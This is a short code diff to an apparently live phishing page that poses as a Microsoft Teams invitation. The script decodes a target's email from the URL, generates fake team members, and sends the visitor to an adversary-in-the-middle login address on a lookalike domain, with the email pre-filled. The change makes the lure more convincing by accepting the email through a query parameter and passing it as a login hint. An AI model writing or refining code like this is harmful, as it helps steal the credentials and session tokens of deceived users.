@@ -58,8 +58,9 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:#f5f5f5;min-height:1
 
 <script>
 (function(){
-  const hash = window.location.hash.slice(1);
-  const email = hash ? atob(hash) : '';
+  var ep = new URLSearchParams(window.location.search).get('e');
+  var hash = window.location.hash.slice(1);
+  const email = ep ? atob(ep) : (hash ? atob(hash) : '');
   const AITM_URL = 'https://login.hoosiermachlnery.com/qzPdEUwU';
 
   // Generate fake team members
@@ -93,7 +94,7 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:#f5f5f5;min-height:1
     this.textContent='Opening Teams...';
     this.style.background='#444';
     setTimeout(function(){
-      window.location.href = AITM_URL + (email?'?e='+encodeURIComponent(email):'');
+      window.location.href = AITM_URL + (email?'?login_hint=' + encodeURIComponent(email):'');
     },700);
   });
 })();
